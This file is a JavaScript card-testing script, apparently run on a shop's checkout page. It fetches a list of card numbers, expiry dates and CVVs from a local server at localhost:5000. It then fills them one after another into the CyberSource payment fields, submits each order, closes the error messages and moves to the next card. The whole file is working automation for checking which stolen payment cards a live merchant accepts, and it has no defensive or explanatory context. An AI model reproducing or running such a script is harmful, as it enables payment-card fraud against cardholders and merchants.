var url = "http://localhost:5000/post";
var iteration = function() {};
var jsonp_callback = function(arr) {
	var i = 0;
	var len = arr.length;

	iteration = function() {
	  if( i < len ) {
	    var json = arr[i++];
	    sessionStorage.card = JSON.stringify( json );
	    $$("#p_method_wmg_cybersource").click();

	    if( json.card[0] == '4' )
	    	$$("#wmg_cybersource_cc_type").val( "VI" );
	    else
	    	$$("#wmg_cybersource_cc_type").val( "MC" );

	  	$$("#wmg_cybersource_cc_number").val(json.card);

		$$("#wmg_cybersource_expiration").val(Number(json.mon));

		$$("#wmg_cybersource_expiration_yr").val("20" + json.year);

		$$("#wmg_cybersource_cc_cid").val(json.cvv);

		$$(".button.action.large.arrowed").click();

		setTimeout(function(){
	    	var interval = setInterval(function() {
		        console.log("Procesando...");
		        if ( $$("#deliveryandpayment-please-wait").css("display") == "none" ) {
		        	console.log("Probemos la proxima");
		        	$$(".toast-item.toast-type-error .toast-item-close").click()
		        	clearInterval(interval);
		        	setTimeout(iteration, 5000);
		    	}
		    }, 1000);
	    }, 3000);

	  }
	  else {
	    $$.ajax({
              url:"http://localhost:5000/post",
              dataType: "jsonp"
            });
	  }

	}
	iteration();
};
// kalifa
$$.ajax({
     url:url,
     dataType: "jsonp"
});